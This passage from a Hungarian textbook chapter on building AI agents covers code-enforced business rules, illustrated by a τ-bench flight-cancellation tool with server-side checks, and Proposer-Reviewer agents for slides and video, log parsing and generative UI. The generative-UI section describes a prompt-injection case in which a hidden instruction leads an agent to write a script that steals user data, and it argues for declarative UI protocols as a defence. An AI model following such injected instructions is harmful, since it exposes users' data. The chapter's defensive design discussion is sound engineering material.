Ez a kísérlet egy általánosabb mintát is feltár: a modell és a heveder kicserélődik egymással. Ha a modell elég erős, a kábelköteg vékonyabb lehet – a modell önmagában helyesen okoskodik, és a kódmegoldó nyeresége szűkül. Ha a modell gyengébb, a kábelkötegnek többet kell tennie – a kulcsfontosságú logikai érvelést a kódra és a kényszermegoldókra kell terhelnie a helyesség garantálása érdekében. Ez az oka annak, hogy ez a kísérlet szándékosan egy gyengébb modellt használ, hogy felerősítse a kontrasztot: gyenge modellen a tiszta gondolkodás folyamatosan hibásan számol, és a kódtámogatás drámaian növeli a pontosságot; kellően erős érvelési modellen a tiszta gondolkodás gyakran minden rejtvényt megold, és a kódsegítésből származó haszon közel nullához konvergál. Az, hogy milyen vastagnak kell lennie a hevedernek, attól függ, hogy hol húzódik a modell képességeinek határa – ezt a feltevést könnyen figyelmen kívül hagyhatjuk bármely ügynöktechnika értékelésekor: ugyanaz a heveder, különböző erősségű modellekkel párosítva, ellentétes következtetéseket támaszthat alá.

### A kód mint az üzleti szabályok megkötése

Ez a rész közvetlen válasz a fejezetben korábban található Harness Engineering fejezetre. A Harness egyik alapelve a „Korlátozások: kódolt, nem dokumentált” – a szabályokat a természetes nyelvű dokumentációból futtatható kódokká alakítja át, és nem tanácsos irányelvekké teszi őket a rendszer viselkedésére vonatkozó kötelező megszorításokká. A kódgenerálás lehetővé teszi az ügynök számára, hogy autonóm módon befejezze ezt az átalakítási folyamatot.

Az üzleti szabályok, a munkafolyamatok és a döntési logika, amelyet csak természetes nyelven írnak le, tele vannak kétértelműséggel. Mit jelent az „ésszerű visszatérítési kérelem”? Mi számít "vészhelyzetnek"? A határok ellenállnak a természetes nyelvi meghatározásnak – a „vásárlástól számított 7 napon belül visszatéríthető” egyértelműnek hangzik, de ezek naptári napok vagy munkanapok? A „vásárlás” a rendelés leadását vagy a kiszállítást jelenti? Ezzel szemben a kód a tudás egyértelmű, végrehajtható reprezentációja – vagy lefut, vagy hibát dob; nincs köztes.

**Az összetett üzleti szabályok precíz kifejezése.**

**Természetes nyelvi szabályok kontra kodifikált szabályok: kiegészítő, nem felcserélhető**

A szabályok beírása a rendszerpromptba lehetővé teszi a modell számára, hogy **elmagyarázza a házirendeket** a felhasználóknak, **azonosítsa a szabályzatnak megfelelő alternatívákat** (pl. „újrafoglalás a törlés helyett”), és előzetes megvalósíthatósági döntést hozzon, mielőtt eszközt hívna meg.

A szabályok érvényesítési eszközként való kódolása három előnnyel jár: **pontos, egyértelmű döntési logika**; **determinisztikus végrehajtás**, tehát ugyanaz a bemenet mindig ugyanazt a kimenetet állítja elő; és az **összetett szabálykombinációk** hatékony kezelése, mint például a többfeltételes logikai logika, az időszámítások és a kereszt-adatforrás-ellenőrzés.

A gyakorlatban ezeket együtt kell használni: a rendszerprompt természetes nyelvi szabályokat tartalmaz a megértés és a kommunikáció érdekében, míg a kulcsfontosságú döntési pontokat kódolt validációs eszközökkel látják el, amelyek „kapuőrként” működnek a megfelelőség biztosítására.

A kodifikált szabályok valódi értéke nem a token hatékonyság, hanem a **visszafordíthatatlan hibák megelőzése**. Előfordulhat, hogy a megrendelés törlését, pénzátutalást vagy az adatok törlését nem lehet visszavonni a végrehajtás után. A kodifikált érvényesítés az utolsó védelmi vonalat helyezi a művelet elé, és ennek a garanciának az értéke jóval meghaladja a megvalósítás költségeit.

**Az ellenőrzés és a végrehajtás összekapcsolása: az ellenőrzőlisták vezetik az érvelést, a hiteles adatok ellenőrzése őrzi a kaput**

Ahelyett, hogy külön ellenőrző eszközt építene, helyezze az érvényesítést a végrehajtási eszközbe. Tekintsük a τ-bench légitársaság törlési szabályzatát, amely az eszközhasználat és a szabályzatnak való megfelelés értékelésére szolgál a szimulált légitársaságok és e-kereskedelmi ügyfélszolgálati forgatókönyvekben:

```python
def cancel_reservation(
    reservation_id: str,
    cancellation_reason: str,        # "change_of_plan", "airline_cancelled", "other"
    expected_cabin_class: str = None,    # Optional: for model self-check; server uses database ground truth for verification
    expected_has_insurance: bool = None  # Optional: for model self-check; same as above
) -> dict:
    """
    Cancel a flight reservation.

    Cancellation policy (enforced server-side based on database ground truth):
    - Rule 1: Reservations with any used segments cannot be cancelled
    - Rule 2: Reservations can be unconditionally cancelled within 24 hours of booking
    - Rule 3: Flights cancelled by the airline can always be cancelled
    - Rule 4: Business class can always be cancelled
    - Rule 5: Basic economy and economy require travel insurance to be cancelled

    Before calling, please query the order details and check each rule above one by one. The expected_* parameters
    record the basis for your judgment. The server compares them with authoritative data for auditing, but they do
    not affect the policy decision.
    """
    # All policy facts are read from the database; never trust values reported by the model
    r = db.get_reservation(reservation_id)
    now = server_clock.now()  # Server clock, not provided by the model

    # Log a warning if the model's self-reported value does not match the ground truth, to detect erroneous beliefs or potential injection
    if expected_cabin_class is not None and expected_cabin_class != r.cabin_class:
        log_mismatch(reservation_id, "cabin_class", expected_cabin_class, r.cabin_class)
    if expected_has_insurance is not None and expected_has_insurance != r.has_insurance:
        log_mismatch(reservation_id, "has_insurance", expected_has_insurance, r.has_insurance)

    if r.any_segment_used:
        return {"success": False, "reason": "Cannot cancel with used segments"}

    hours_since_booking = (now - r.booking_time).total_seconds() / 3600
    if hours_since_booking < 0:
        return {"success": False, "reason": "Booking time is in the future"}
    if hours_since_booking <= 24:
        execute_cancellation(reservation_id)
        return {"success": True, "reason": "Cancelled within 24-hour window"}

    if r.flight_status == "cancelled_by_airline":
        execute_cancellation(reservation_id)
        return {"success": True, "reason": "Airline cancelled flight"}

    if r.cabin_class == "business":
        execute_cancellation(reservation_id)
        return {"success": True, "reason": "Business class cancellation"}

    if r.cabin_class in ["basic_economy", "economy"]:
        if r.has_insurance:
            execute_cancellation(reservation_id)
            return {"success": True, "reason": f"{r.cabin_class} with insurance"}
        return {"success": False, "reason": f"{r.cabin_class} requires insurance"}

    return {"success": False, "reason": "Does not meet cancellation policy"}
```

Ennek a kialakításnak az értékét két szinten kell megérteni.

**Első szint: a paraméterek gondolkodási ellenőrzőlistaként.** Az eszköz leírása felsorolja a teljes törlési szabályzatot, és előírja, hogy a modell "kérje le a rendelés részleteit, és egyenként ellenőrizze az egyes feltételeket hívás előtt"; az opcionális `expected_*` paraméterek még inkább arra késztetik a modellt, hogy kifejezetten írja ki saját érvelését. A paraméterek kitöltéséhez a modellnek először meg kell hívnia a lekérdező eszközt, hogy megkapja a rendelés részleteit, és egyenként ellenőrizze az egyes feltételeket – a paraméterek kitöltése ezért **kötelező ellenőrzőlistaként** működik. Ha a modell úgy találja, hogy a kabinosztály turistaosztályú, és nem vásároltak biztosítást, a hívás előkészítése során észreveheti az 5. szabályt, és ezért **kerülje a kezdeményezést**, ehelyett közvetlenül azt mondja a felhasználónak: "A biztosítás nélküli turistaosztály nem mondható le. A foglalás törlése vagy módosítása előtt fontolja meg a biztosítás megvásárlását." Ez a réteg irányítja az érvelést és csökkenti az érvénytelen hívások számát; ez azonban nem biztonsági határ. A `expected_*` értékek csak saját maguk által bejelentett követelések, soha nem olyan tények, amelyekben a szerver megbízik.

**Második szint: a szerveroldali hiteles adatok kapuőrként való ellenőrzése.** Figyeljük meg a kód kulcsfontosságú felépítését: a kabinosztályt, a biztosítási állapotot, a foglalás idejét, a szakaszok felhasználását és a járat állapotát a szerver kérdezi le az adatbázisból; az aktuális idő a szerver órájából származik. **Egyetlen szabályzati tény sem a modell által megadott paraméterből ered.** Ez nem fölösleges ismétlés: a modell hallucinálhat vagy promptinjekcióval manipulálható, és – ahogy a korábbi Lethal Triad-elemzés megmutatta – az egyetlen kontextusban működő Ügynök nem tudja megbízhatóan kikényszeríteni a saját szabálykövetését. Ha a `cabin_class`, `has_insurance` vagy akár a `current_time` értékét is a modell töltené ki, egyetlen téves – véletlenül vagy támadás hatására megadott – érték megkerülhetné a kapuőrt. Az utolsó védelmi vonalnak olyan adatokra kell épülnie, amelyeket a modell nem tud meghamisítani. Ez összhangban van azzal a korábbi elvvel, hogy „a kritikus műveletek független ellenőrzést igényelnek”: a függetlenség nemcsak másik modellt, hanem független adatforrást is jelenthet.

A háromszintű biztosíték így teljes: (1) a rendszer természetes nyelvi szabályai azonnali segítik a megértést és a magyarázatot; (2) az eszközleírások és a paramétertervezés ellenőrzőlistaként szolgálnak, és a modellt a feltételek explicit ellenőrzéséhez irányítják a hívás előtt; (3) A szerveroldali kódalapú érvényesítés az adatbázis alapigazságát használva a végső kapuőr szerepét tölti be. Az első két szint csökkenti a hibák előfordulását, a harmadik pedig biztosítja, hogy a hibák ne váljanak visszafordíthatatlan veszteséggé.

> **5-3. kísérlet ★★: A kis modellek kódalapú tudás révén javítják a szabályvégrehajtás pontosságát**
>
> **Kísérlet célja**: Győződjön meg arról, hogy az összetett üzleti szabályok kódban való kódolása jelentősen javítja a pontosságot és konzisztenciát, amellyel egy kis modell (Qwen3-4B) végrehajtja ezeket a szabályokat.
>
> **Technikai megközelítés**: Tervezzen meg egy ellenőrzött kísérletet a τ-bench légitársaság ügyfélszolgálati forgatókönyve alapján. **Vezérlőcsoport**: Tiszta természetes nyelvi szabályok, a modell saját érvelésére támaszkodva. **Kísérleti csoport**: Háromszintű védelem – a rendszerkérdés megtartja a természetes nyelvi szabályokat; Az eszköz leírása felsorolja a teljes szabályzatot, és opcionális `expected_*` paramétereket használ, amelyek irányítják a modellt az egyes feltételek egyenkénti ellenőrzéséhez a hívás előtt (ellenőrző lista); az eszköz belsőleg kód alapú érvényesítést hajt végre a szimulált adatbázis alapigazsága alapján (az összes politikai tényt az adatbázisból szerzi be, az időt a szerver órájából veszik, és a modell önbeszámolt paraméterei nem megbízhatóak). Értékelési mutatók: feladat sikerességi aránya, irányelvsértések száma, érvénytelen eszközhívások száma, felhasználói élmény.
>
> **Várható eredmények**: A kísérleti csoport jelentősen felülmúlja a kontrollcsoportot. Ennél is fontosabb, hogy a modell autonóm módon azonosítja a szabálysértéseket a paraméterek előkészítése során, és alternatívákat kínál az eszköz meghívása nélkül, ellenőrzőlistaként bemutatva a paraméterek értékét. Végül mérje meg az önbeszámolt `expected_*` értékek és az adatbázis alapvalósága közötti eltérés arányát, hogy megmutassa, miért szükséges a szerveroldali érvényesítés az érvelési hibák észleléséhez.
>

### Kódvezérelt multimédia generálás

Számos összetett dokumentum létrehozása lényegében strukturált adatok rendszerezése és bemutatása. Legyen szó prezentációról, műszaki jelentésről vagy interaktív alkalmazásról, az alapul szolgáló struktúrát kód határozza meg – a HTML írja le a szerkezetet, a CSS vezérli a stílust, a JavaScript pedig az interaktivitást valósítja meg. A hagyományos dokumentumkészítés GUI-alapú WYSIWYG szerkesztőkre támaszkodik, amelyek rosszul illeszkednek az ügynökökhöz, mert vizuális értelmezést és pontos mutatóelhelyezést igényelnek. A kódgenerálás révén az ügynökök megkerülik a vizuális pozicionálás kihívását, és pontos irányítást szereznek a dokumentumok felett – az egyes elemek helyzete, stílusa és tartalma egyértelműen meghatározott, és programozottan módosítható és optimalizálható.

**PPT-generáló ügynök.**

A PPT létrehozása köztudottan fáradságos. Egy tipikus akadémiai prezentáció több tucat dián fut, amelyek mindegyike gondos elrendezést, desztillált kulcspontokat és jól megválasztott diagramokat igényel. A PPT létrehozásának újrakeretezése kódgenerálási problémaként azonban a bonyolultság nagy része megszűnik. A modern prezentációs keretrendszerek, mint például a Slidev, elegáns tervezési filozófiát ölelnek fel: Markdown és HTML-ben határozzák meg a tartalmat. A dia létrehozása néhány sor tömör jelölést igényel, és a keretrendszer kezeli a megjelenítést, az elrendezést és az animációt. Egy olyan ügynök számára, aki elsajátította a kódgenerálást, ez ideális terep.

![5-5. ábra: Javaslattevő-ellenőrző mechanizmus a PPT generálásához](images/fig5-5.svg)

A kód generálása azonban nem elég. **Miután az ügynök megírta a kódot, fogalma sincs, hogyan jelenik meg valójában az eredmény**: túl zsúfolt tartalom, túlcsorduló szöveg, rossz méretű képek – ezek mindaddig nem láthatók, amíg a diák ténylegesen meg nem jelenik. Ezért egy **Javaslat-ellenőr** mechanizmusra van szükség (az 5-5. ábrán látható) ahhoz, hogy kódgenerálást és minőség-ellenőrzést rendeljünk két független ügynökhöz:

- **A javaslattevő ügynök** felelős a Slidev-kód generálásáért, a tartalom logikai szerkezetének megértéséért és annak ésszerű oldalakra bontásáért.
- Az **ellenőrző Ügynök** futtatja a kódot, minden oldalt képként renderel, majd egy látással rendelkező, multimodális LLM segítségével értékeli a diák tartalomsűrűségét, olvashatóságát, elrendezését és vizuális vonzerejét. **Strukturált javítási javaslatokat készít**: nem annyit mond, hogy „nem néz ki jól”, hanem konkrét, végrehajtható útmutatást ad, például „3. oldal: túl sok a tartalom, érdemes kettébontani” vagy „7. oldal: túl kicsi a kódblokk betűmérete, növeld 14 pontra”. A visszajelzés olyan mezőket tartalmaz, mint az oldalszám, a probléma típusa és súlyossága.

A Javaslattevő megkapja a visszajelzést, értelmezi azt, módosítja a kódot, és az új verziót újra benyújtja a Lektornak. Ez a ciklus addig folytatódik, amíg a prezentáció el nem éri a minőségi szabványt, vagy el nem éri az ismétlések maximális számát (például öt fordulót). A "minőség megfelel a szabványnak" és a "maximális kör" pontosan az a kétféle explicit leállási feltétel, amelyet a Loop Engineering követel: az előbbi lehetővé teszi a bíráló számára, hogy eldöntse a célt; ez utóbbi egy költségvetési sapka, amely megakadályozza, hogy a hurok elszaladjon.

A javaslattevő-ellenőrző ciklus itt ugyanazt a mintát követi, mint a 4. fejezet **előzetes jóváhagyási** mechanizmusa: az egyik ügynök generál, a másik pedig függetlenül értékeli. A két alkalmazás célja és munkafolyamata tekintetében különbözik. A 4. fejezet a mintát használja egyetlen visszafordíthatatlan művelet jóváhagyására vagy elutasítására; itt az iteratív tartalomfejlesztést hajtja végre több körön keresztül, miközben a felülvizsgáló azt látja, hogy a kimenet nem érhető el a Javaslattevő számára. A tervezési alapelvek konzisztensek (megosztott cél megkötései, különböző modellcsaládok használata a hasonló hibák valószínűségének csökkentése érdekében, visszacsatolás, mint speciális esemény, amely hozzáadódik a Javaslattevő pályájához). Az együgynökös hurok helyett a kettős munkamegosztás használatának **alapvető előnye** a **környezetkezelésben** rejlik: a Reviewer csak a legújabb verzió renderelt képeit dolgozza fel, a korábbi verziók nem befolyásolják; a Javaslattevő csak strukturált szöveges visszajelzést halmoz fel, kevesebb tokent fogyaszt, és megkönnyíti az érvelést. Együgynökös megoldásnak több körből több tucat oldalra, ugyanabban a kontextusban kellene felhalmoznia a renderelt képeket, gyorsan túllépve a kontextuskorlátot. Ezt a mechanizmust a későbbi videószerkesztési és naplómegjelenítési kísérletekben újra felhasználják; A 10. fejezet a Javaslattevő-Recenzens paradigmán túl további többügynökös együttműködési módokat is megvizsgál.

> **5-4. kísérlet ★★: Automatikus PPT előállítás papírokból**
>
> **Kísérlet célja**: Kiváló minőségű prezentációk automatikus generálása tudományos dolgozatokból, igazolva a javaslattevő-ellenőri mechanizmus hatékonyságát a tartalomkészítés minőségellenőrzésében.
>
> **Technikai megközelítés**: Használja a Slidev keretrendszert. A javaslattevő Ügynök beolvassa a tanulmány PDF-fájlját, kinyeri a fejezetszerkezetet, a fő érveket és az ábrákat, megtervezi a prezentáció felépítését, majd diánként előállítja a Slidev-kódot. **Kulcslépés**: Az ellenőrző Ügynök minden diát renderel és képernyőképet készít, majd egy látással rendelkező LLM segítségével megkeresi a szövegtúlcsordulást, a zsúfolt tartalmat és a rosszul méretezett képeket. A javaslattevő és az ellenőrző addig iterál, amíg a prezentáció el nem éri a minőségi követelményeket.
>
> **Elfogadási feltételek**: Készítsen 10-20 diát, amelyek lefedik a dolgozat főbb hozzájárulásait. Tartalmazzon legalább 3 eredeti ábrát, amelyek megegyeznek a kísérő szöveggel. Nincs túlcsordulás a szövegben, ésszerű elrendezés. Hasonlítsa össze a kontextusfogyasztást és a generálás minőségét az együgynök által végzett önellenőrzés és a javaslattevő-bíráló munkamegosztás között.
>

> **5-5. kísérlet ★★: papíralapú magyarázó videók automatikus generálása**
>
> **Kísérlet célja**: A PPT-generálási képességek bővítése a vizuális és hallható csatornák kombinálásával a magyarázó videók automatikus generálása érdekében.
>
> **Technikai megközelítés**: Az 5-4. kísérlet prezentációs munkafolyamatára építve az ügynök társalgási narrációt is generál minden diához – a dia szövegének megismétlése helyett – a nézőt irányítva – TTS (text-to-speech) segítségével szintetizálja a hangot, és a diaképeket és a hangot az FFmpeggel kombinálja a végső videó elkészítéséhez.
>
> **Elfogadási feltételek**: Készítsen egy 5–15 perces videót, amelyben minden dia megjelenítési ideje pontosan igazodik a narrációhoz, a narráció pedig megfelel a vizuális elemeknek.
>
>
> ![5-6. ábra: Végtől-végig tartó folyamat a papírtól a magyarázó videóig](images/fig5-6.svg)
>
>

**Videószerkesztő ügynök.**

A videó szerkesztése általános célú számítógép-használati felületen keresztül alapvető akadályt jelent: a videószerkesztő grafikus felhasználói felületek rendkívül összetettek – sűrűek az idővonalakkal, rétegekkel és hatáspanelekkel. Az Ügynöknek ezeket az elemeket egérrel és billentyűzettel kell megkeresnie és kezelnie, amihez pontos koordinátákra van szükség, amelyeket a modellek nehezen tudnak előállítani.

A videószerkesztés API-hívásokká és kódgenerálássá történő átkeretezése drámaian csökkenti a bonyolultságot. Számos professzionális szoftvereszköz (mint például a Blender – egy nyílt forráskódú 3D-s készítő és videó-összeállító eszköz, amely támogatja a Python-szkripteket; az FFmpeg – a svájci hadsereg parancssori kése audio/videó feldolgozásához) programozott API-felületeket biztosít, amelyek strukturáltan, komponálható módon teszik elérhetővé az alapvető funkciókat. Például a Blender Python API lehetővé teszi az olyan műveletek precíz vezérlését, mint az importálás, vágás, rendezés, átmeneti effektusok hozzáadása és hangkeverés a videoklipekhez, minden művelet egy tiszta függvényhívásnak felel meg. Egy ügynök számára a természetes nyelvi követelmények API-hívásokká konvertálása sokkal könnyebb, mint a grafikus felület megértése és az egérkattintások szimulálása. A PPT generálásához hasonlóan a videószerkesztés is alkalmazza a Proposer-Reviewer mechanizmust – a Proposer Agent Blender szkripteket generál, a Reviewer Agent kulcskockákat jelenít meg, és Vision LLM segítségével ellenőrzi a hatást, visszajelzést adva a módosításokhoz.

> **5-6. kísérlet ★★: API-alapú intelligens videószerkesztés**
>
> **Kísérlet célja**: A Blender Python API kód ​​generálásával ellenőrizze az ügynök videószerkesztési képességét, és értékelje a látás-visszacsatoláson alapuló Proposer-Reviewer mechanizmus szerepét a multimédiás tartalomfeldolgozásban.
>
> **Alapvető kihívás**: A felhasználó természetes nyelvi szerkesztési követelményeinek megértése és átalakítása API-hívások pontos sorozatává, különféle szerkesztési műveletek kezelése (kivágás, összevonás, feliratok, hangsávkeverés, vizuális effektusok), valamint a generált Python-szkript megfelelő végrehajtásának biztosítása. Miután a javaslattevő ügynök megírta a kódot, nem tudja közvetlenül megítélni a videoeffektust; a Reviewer Agentre kell támaszkodnia a kulcskockák megjelenítéséhez és Vision LLM használatával történő ellenőrzéséhez.
>
> **Technikai megközelítés**: A felhasználó videóanyagot biztosít (pl. nyers felvételek, amelyek olyan jeleneteket tartalmaznak, mint a szörfözés, túrázás, síelés), és természetes nyelven írja le a követelményeket (pl. „Vágd ki a szörfözési részt”). A javaslattevő ügynök egy videoelemző alügynököt használ **kétlépcsős lokalizációs stratégiával**:
>
> **1. lépés, durva lokalizáció**: Hívja meg az alügynököt a videó útvonallal, egy 10 másodperces képkocka-mintavételezési időközzel és a célkérdéssel. Az alügynök az ffmpeg segítségével rögzíti a képkockákat ebben az intervallumban, elküldi a képernyőképeket és a kérdést egy Vision LLM-nek, és visszaadja a jelenet intervallumát (pl. "A szörfözés 40-110 másodperc között van").
>
> **2. lépés, finomszemcsés lokalizáció**: Hívja újra az alügynököt egy szűkebb tartományban, és vegyen mintát másodpercenként egy képkockával a határok pontos meghatározásához.
>
> A videoelemzés segédügynökként való beágyazása megakadályozza, hogy nagyszámú képernyőkép elfoglalja a fő ügynök környezetét. A lokalizáció után a javaslattevő létrehozza a Blender API parancsfájlt. A Reviewer Agent végrehajt egy gyors előnézetet, ellenőrzi a kulcskockákat, és visszajelzést ad a módosításokhoz, ismételve, amíg el nem éri a szabványt a teljes renderelés előtt.
>
> **Elfogadási feltételek**: Az Ügynök pontosan tudja azonosítani a videó különböző jeleneteit, és a természetes nyelvi utasítások alapján helyesen szerkeszti a szerkesztési szkripteket. A kezdő- és végpont pontos (3 másodpercen belüli hiba). Ha az utasítások speciális effektusokat tartalmaznak (lassított felvétel, átmenetek, feliratok), akkor a létrehozott videó megfelelően alkalmazza az effektusokat. A felülvizsgáló ügynök képes észlelni a nyilvánvaló hibákat (hiányzó kulcstartalom, beleértve az irreleváns szegmenseket is), és kiváltja a javításokat. A végső kimeneti videofájl formátuma megfelelő, és megfelel az elvárt minőségnek.
>

### Kód mint Rendszer Adapter

Az előző szakaszokban a multimédia generálás a kódot a kimeneti formátumok szélesítésére használta; ez a szakasz a kódot fordított irányban használja — **a rendszer alkalmazkodik a külső formátumok fejlődéséhez**. A naplók elemzésétől a vizualizációig a kódgenerálás lehetővé teszi az Ágens számára, hogy a statikus eszközkészletről a dinamikus alkalmazkodásra váltson.

"Log Parsing."

A hagyományos naplóelemzés forgatókönyvekben, amikor a naplóformátum megváltozik, a mérnököknek frissíteniük kell a szabályokat vagy a reguláris kifejezésmintákat az elemzőben. A Kódoló Ágens ezt a folyamatot automatizálhatja: ahelyett, hogy előre meghatározott elemző kódot karbantartana, az Ágens minden alkalommal új elemző kódot generál, amikor naplófájlokat dolgoz fel, a bemeneti naplók pozitív és negatív mintáira támaszkodva.

Ez a képesség különösen értékes a nem strukturált naplók kezelésére, és azért, mert a naplóformátumok gyakran frissülnek. A statikus elemzők megszakítják a folyamatot, amikor a formátum változik. Ezzel szemben a kódot generáló Ágens minden alkalommal új elemzőt hoz létre, természetesen alkalmazkodva a formátum fejlődéséhez. Az elemzési logika nem meghatározott, hanem a bemeneti adatokból kód formájában van levezetve. Ez a kód mint rendszer adapter lényege: **a rendszer a generált kódon keresztül alkalmazkodik a külső szabványok változásaihoz anélkül, hogy az Ágens kódban rögzített eszközöket kellene frissíteni**.

"Intelligens Napló Diagnosztikai Csővezeték."

A naplóelemzésen túl egy teljes intelligens napló diagnosztikai csővezeték építhető a kódgenerálás és a termelési technikák alapján. Az Ágens elemzi a termelési trajektóriák halmazát a rendszerarchitektúra dokumentumokkal és PRD-kkel együtt, hogy azonosítsa a problémamintákat és az érintett modulokat. Ezt követően strukturált problémajelentéseket generál, amelyek a prioritást, a modult, a leírást és az ajánlott fejlesztéseket tartalmazzák. Ezen felül regressziós teszteket generál, amelyek a trajektória ID-khoz és interakciós körökhöz vannak kötve; a tesztkeretrendszer visszajátssza ezeket az eseteket és ellenőrzi az eredményeket. Végül az Ágens GitHub issue-kat hoz létre MCP-n keresztül.

> **Kísérlet 5-5 ★★: Intelligens Napló Elemzési Csővezeték**
>
> "Kísérlet Célja": Ellenőrizze, hogy a Kódoló Ágens képes-e intelligens naplóelemzésre a kódgenerálás és a termelési technikák alapján.
>
> "Műszaki Megközelítés": Az Ágens elemzi a termelési trajektóriák halmazát a rendszerarchitektúra dokumentumokkal és PRD-kkel együtt, hogy azonosítsa a problémamintákat és az érintett modulokat. Ezután strukturált problémajelentéseket generál, amelyek a prioritást, a modult, a leírást és az ajánlott fejlesztéseket tartalmazzák. Regressziós teszteket is generál, amelyek a trajektória ID-khoz és interakciós körökhöz vannak kötve; a tesztkeretrendszer visszajátssza ezeket az eseteket és ellenőrzi az eredményeket. Végül az Ágens GitHub issue-kat hoz létre MCP-n keresztül.
>
>
> ![5-7. ábra: Intelligens termelési napló diagnosztikai folyamata](images/fig5-7.svg)
>
>

### Kód mint Generatív UI

A hagyományos Ágens rendszerek főként egyszerű szöveges párbeszéden keresztül kommunikálnak a felhasználókkal. De a szöveg lineáris, egydimenziós közeg, és sok forgatókönyvben hatástalan. A strukturált információk gyűjtése hosszas oda-vissza kommunikációt igényel; a komplex adatkapcsolatokat nehéz egyszerű szövegben kifejezni; és amikor a felhasználóknak lehetőségek közül kell választaniuk, egy szöveges lista sokkal kevésbé intuitív, mint egy vizuális felület.

A kódgenerálás kiutat kínál ezekből a korlátokból: az Ágensek dinamikusan generálhatnak űrlapokat, interaktív diagramokat és akár teljes webalkalmazásokat, a statikus szöveges párbeszédet gazdag, multimodális interakcióvá alakítva. Ezt a mintát, ahol az Ágens dinamikusan generálja a felületet, "Generatív UI"-nak nevezzük.

"A2UI-szerű Protokollok: A Generatív UI Szabványosítása."

Ha az Ágenseknek megengedjük, hogy HTML-t és JavaScriptet generáljanak, amelyeket a kliens közvetlenül renderel és hajt végre, az alapvető biztonsági kockázatot teremt: a generált kód rosszindulatú lehet. Például, ha valaki szándékosan elrejt egy utasítást a bemenetben, az Ágens prompt injekció által manipulálható, tudtán kívül olyan szkriptet generálva, amely észrevétlenül lopja el a felhasználó adatait. Itt az ok-okozati lánc számít: a "prompt injekció" — a rosszindulatú utasítások, amelyek az Ágens bemenetébe keverednek — az ok, míg a kapott rosszindulatú szkript böngészőben való végrehajtása és az adatok ellopása a hagyományos webes XSS-hez (Cross-Site Scripting) hasonlít; a támadást összességében nem szabad egyszerűen XSS-nek címkézni. A deklaratív felületi protokollok, mint az A2UI (Agent-to-User Interface), biztonságosabb megközelítést kínálnak. Ahelyett, hogy közvetlenül végrehajtható kódot generálna, az Ágens csak egy JSON "UI leírás manifest"-et ad ki, például "Jeleníts meg egy táblázatot három sorral és két oszloppal, 'Értékesítési Adatok' címmel." A kliens ezután a saját előre meghatározott, biztonságos komponenseit használva rendereli a felületet. Ez olyan, mint egy éttermi étlap: a vendég (Ágens) csak az étlapon szereplő ételeket (előre meghatározott komponenseket) rendelheti meg, nem léphet be a konyhába és készíthet tetszőleges ételeket (hajthat végre tetszőleges kódot). Egy gyakori összetévesztés az AG-UI (Agent-User Interaction, CopilotKit által javasolt). A hasonló név ellenére nem egy UI leíró nyelv, hanem egy "esemény- és szállítási protokoll", amely az Ágens végrehajtási állapotát — üzeneteket, eszközhívásokat és állapotjavításokat — streameli a frontend felé; UI rakományokat is hordozhat, például A2UI manifesteket. A kettő kiegészíti egymást, és nem szabad őket ugyanazon deklaratív felületi kategória példáiként csoportosítani.

Az ilyen protokollok központi tervezési elve a "biztonság első": a kliens fenntart egy megbízható komponenskatalógust (pl. Card, Button, TextField, Table), és ha a katalógus és a renderelő helyesen van érvényesítve, az Ágens csak a katalógusban szereplő komponenseket kérheti, és nem injektálhat tetszőleges kódot. A kliens a saját natív komponenseit használja a rendereléshez, nem az Ágens által generált tetszőleges HTML végrehajtásával. Ezek a protokollok jellemzően támogatják a "platformok közötti renderelést" (ugyanaz a leírás React-ben, Flutter-ben és natív alkalmazásokban renderelődik) és az "inkrementális generálást" (például JSONL streamelésével, amelyet a kliens renderel érkezéskor).

Természetesen a deklaratív megközelítés a szabványosított interakciós forgatókönyvekhez (űrlapok, táblázatok, kártyák) alkalmas, míg a magasan testre szabott igényekhez (pl. egyedi vizualizációk, játékfelületek) a közvetlen kódgenerálás marad a rugalmasabb választás. Az alábbiakban mindkét minta konkrét alkalmazásai találhatók.

"Eredmények Leadása HTML-lel: Markdown Jelentések Felváltása." A Generatív UI nem csak az interakció során használatos, hanem az Ágens végső "leadandó termékének" formáját is megváltoztatja. Hagyományosan az Ágens befejez egy feladatot és átad egy Markdown jelentést; de a lineárisan elrendezett Markdown lapozgatása nem kellemes olvasási élmény. Ahogy az Ágensek egyre jobbak a frontend kód generálásában, a gyakorlat afelé tolódik, hogy közvetlenül HTML-t állítsanak elő. A Markdown-hoz képest a HTML leadandóknak több egyértelmű előnye van. Először, az "interaktív bemutatók" lehetővé teszik a felhasználók számára, hogy interaktív formában lássák a rendszer működését, ami gyakran könnyebben érthető első ránézésre, mint a hosszadalmas szöveges leírások. Másodszor, a "jobb adatvizualizáció" lehetővé teszi a felhasználók számára, hogy diagramokon és interaktív vezérlőkön keresztül böngésszenek, szűrjenek és merüljenek el a részletekben. Harmadszor, a "folyamatosan fejleszthető leadandók" lehetővé teszik az Ágens számára, hogy a feladat során folyamatosan frissítse és bővítse a HTML weboldalt ahelyett, hogy csak a végén hozna létre egy statikus artefaktumot.

A szerző saját tapasztalata a kutatási cikkek írásában példaként: minden kutatási projekthez a szerző egy interaktív weboldalt[^ch5-4] tart fenn. Ez egyszerre szolgál végső leadandóként és élő dokumentumként a kutatási folyamat során — a szerző az Ágenssel folyamatosan frissítteti, ahogy a kísérletek haladnak. Ez a weboldal legalább három célt szolgál. Először, "kísérleti adatok visszakövethetősége": minden kísérlet specifikus adatai, a használt promptok és az LLM nyers válaszai egyenként ellenőrizhetők az oldalon; mindent nyíltan közzétéve könnyebb észrevenni a problémákat az adatépítésben, a formátumban és az elosztásban, valamint a szisztematikus torzításokat az LLM válaszaiban vagy a bíró pontozásában. Másodszor, "tréning metrika monitorozás": az oldal közvetlenül megjeleníti a tréning görbéket, megkönnyítve a modell "belső egészségügyi metrikáinak" figyelését és annak meghatározását, hogy a tréning folyamat egészséges-e. A kifejezés az orvostudományból kölcsönzött: ezek a tréning folyamat egészségének belső jelei — tréning és validációs veszteség, gradiens norma, tanulási ráta, a modell perplexitása tokenek kibocsátásakor (a modell "biztonságának" mérőszáma a saját kimenetében), és a megerősítéses tanulásban a jutalom, KL divergencia és politikai entrópia. Ezek eltérnek a végső eredménymutatóktól, mint a feladatpontosság: ahogy a fiziológiai értékek egy kivizsgáláson elkülönülnek egy személy külső teljesítményétől, a belső egészségügyi metrikák gyakran sokkal korábban jeleznek problémákat — nem konvergáló veszteség, robbanó gradiensek, tréning összeomlás. Harmadszor, "a rendszer működésének bemutatása": a vizualizációk feltárják, hogyan működik a teljes rendszer, lehetővé téve az olvasók számára, hogy egy pillantással megértsék az AI által épített rendszer struktúráját.

